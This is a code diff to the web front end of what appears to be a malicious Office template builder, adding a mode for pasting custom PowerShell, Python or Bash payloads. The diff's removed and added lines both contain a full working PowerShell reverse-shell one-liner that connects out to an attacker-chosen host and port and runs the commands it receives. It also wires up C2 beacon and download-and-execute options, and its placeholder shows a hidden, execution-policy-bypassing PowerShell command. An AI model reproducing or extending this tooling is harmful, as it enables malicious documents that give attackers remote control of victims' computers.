@@ -105,6 +105,17 @@
                     </div>
                 </div>
                 
+                <div class="border-t border-gray-600 pt-4">
+                    <label class="block text-gray-300 text-sm mb-2 flex items-center gap-2">
+                        <input type="checkbox" id="useCustomPayload" onchange="toggleCustomPayloadMode()" class="w-4 h-4">
+                        <span>💾 Use Custom Payload (instead of auto-generation)</span>
+                    </label>
+                    <textarea id="customPayload" rows="6" placeholder="Kendi PowerShell / Python / Bash kodunuzu yapıştırın...&#10;&#10;Örnek:&#10;powershell -NoP -NonI -W Hidden -Exec Bypass -Command..."
+                              class="w-full bg-gray-700 text-white rounded-lg px-4 py-2 border border-gray-600 font-mono text-sm disabled:opacity-50"
+                              disabled></textarea>
+                    <p class="text-xs text-gray-500 mt-1">📌 Custom payload aktif olunca Host:Port yoksayılır</p>
+                </div>
+                
                 <div>
                     <label class="block text-gray-300 text-sm mb-1">Custom VBA Macro (optional)</label>
                     <textarea id="customMacro" rows="4" placeholder="Sub AutoOpen()&#10;    ' Your custom VBA code&#10;End Sub"
@@ -282,8 +293,29 @@
 </div>
 
 <script>
+function toggleCustomPayloadMode() {
+    const useCustom = document.getElementById('useCustomPayload').checked;
+    const customPayloadField = document.getElementById('customPayload');
+    const shellHostDiv = document.getElementById('shellHostDiv');
+    const beaconUrlDiv = document.getElementById('beaconUrlDiv');
+    const downloadUrlDiv = document.getElementById('downloadUrlDiv');
+    
+    customPayloadField.disabled = !useCustom;
+    
+    if (useCustom) {
+        shellHostDiv.classList.add('hidden');
+        beaconUrlDiv.classList.add('hidden');
+        downloadUrlDiv.classList.add('hidden');
+    } else {
+        updateTemplateParams();
+    }
+}
+
 function updateTemplateParams() {
     const payloadType = document.getElementById('templatePayloadType').value;
+    const useCustom = document.getElementById('useCustomPayload').checked;
+    
+    if (useCustom) return;
     
     document.getElementById('shellHostDiv').classList.add('hidden');
     document.getElementById('beaconUrlDiv').classList.add('hidden');
@@ -304,6 +336,7 @@ updateTemplateParams();
 document.getElementById('templateForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
+    const useCustomPayload = document.getElementById('useCustomPayload').checked;
     const payloadType = document.getElementById('templatePayloadType').value;
     const data = {
         name: document.getElementById('templateName').value || 'MaliciousTemplate',
@@ -312,16 +345,43 @@ document.getElementById('templateForm').addEventListener('submit', function(e) {
         custom_payload: document.getElementById('customMacro').value || null
     };
     
-    // Add payload-specific params
-    if (payloadType === 'reverse_shell') {
-        data.host = document.getElementById('shellHost').value;
-        data.port = parseInt(document.getElementById('shellPort').value) || 4444;
-        data.payload = `$client = New-Object System.Net.Sockets.TCPClient('${data.host}',${data.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-    } else if (payloadType === 'beacon') {
-        data.c2_url = document.getElementById('beaconUrl').value;
-        data.interval = 60;
-    } else if (payloadType === 'download_exec') {
-        data.payload_url = document.getElementById('payloadUrl').value;
+    // Custom payload mode
+    if (useCustomPayload) {
+        const customCode = document.getElementById('customPayload').value;
+        if (!customCode.trim()) {
+            alert('❌ Custom payload alanı boş! Kodunuzu yapıştırın.');
+            return;
+        }
+        data.payload = customCode;
+        data.custom_payload_mode = true;
+    } else {
+        // Auto-generation mode
+        if (payloadType === 'reverse_shell') {
+            const host = document.getElementById('shellHost').value;
+            const port = parseInt(document.getElementById('shellPort').value) || 4444;
+            if (!host) {
+                alert('❌ Host alanını doldurun!');
+                return;
+            }
+            data.host = host;
+            data.port = port;
+            data.payload = `$client = New-Object System.Net.Sockets.TCPClient('${host}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+        } else if (payloadType === 'beacon') {
+            const c2Url = document.getElementById('beaconUrl').value;
+            if (!c2Url) {
+                alert('❌ C2 URL alanını doldurun!');
+                return;
+            }
+            data.c2_url = c2Url;
+            data.interval = 60;
+        } else if (payloadType === 'download_exec') {
+            const payloadUrl = document.getElementById('payloadUrl').value;
+            if (!payloadUrl) {
+                alert('❌ Payload URL alanını doldurun!');
+                return;
+            }
+            data.payload_url = payloadUrl;
+        }
     }
     
     fetch('/office-template/api/create-template', {
